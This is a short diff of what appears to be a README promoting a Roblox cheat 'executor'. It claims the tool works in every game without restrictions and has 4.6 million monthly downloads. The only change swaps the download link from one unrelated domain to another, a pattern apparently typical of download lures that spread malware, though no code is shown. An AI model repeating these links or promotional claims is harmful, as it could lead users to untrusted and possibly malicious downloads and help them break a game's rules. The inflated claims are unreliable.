@@ -66,7 +66,7 @@ A: Yes — works in every Roblox game without restrictions.
 
 **Monthly downloads:** 4.6m+
 
-[![Download](https://img.shields.io/badge/Download-v9.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/rblxexec19)
+[![Download](https://img.shields.io/badge/Download-v9.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/rblxexec19)
 
 ---
 
